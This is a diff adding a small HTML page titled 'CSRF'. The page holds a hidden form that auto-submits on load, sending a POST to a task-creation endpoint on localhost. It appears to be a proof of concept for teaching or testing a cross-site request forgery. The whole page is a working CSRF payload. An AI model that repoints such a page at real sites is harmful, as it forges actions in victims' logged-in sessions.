@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta content="text/html;charset=utf-8" http-equiv="Content-Type">
+<meta content="utf-8" http-equiv="encoding">
+
+	<title>CSRF</title>
+</head>
+<body>
+<form method="POST" action="http://localhost:4000/task/create">
+	<input type="hidden" name="title" value="learn dancing">
+</form>
+</body>
+<script >
+
+	 document.forms[0].submit();
+</script>
+</html>
